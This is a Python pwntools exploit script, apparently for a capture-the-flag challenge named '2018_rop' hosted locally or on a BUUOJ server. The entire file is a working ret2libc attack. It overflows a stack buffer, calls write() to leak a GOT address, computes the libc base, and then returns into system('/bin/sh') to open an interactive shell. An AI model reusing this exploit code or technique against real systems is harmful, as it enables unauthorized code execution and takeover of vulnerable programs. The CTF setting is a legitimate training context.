import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./2018_rop')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./2018_rop')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29835)
			elf=ELF('./2018_rop')
			libc=ELF('../../i386libc/libc.so.6')


		bss_1=elf.bss()+0x200


		# gdb.attach(io)
		# pause()
		pay='a'*0x8c+p32(elf.sym['write'])+p32(0x080483C0)+p32(1)+p32(elf.got['write'])+p32(4)
		#io.recv()
		io.send(pay)
		libc_base=u32(io.recv(4))-libc.sym['write']
		libc.address=libc_base
		pay='a'*0x8c+p32(libc.sym['system'])+p32(1)+p32(libc.search('/bin/sh\x00').next())
		io.send(pay)


		success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue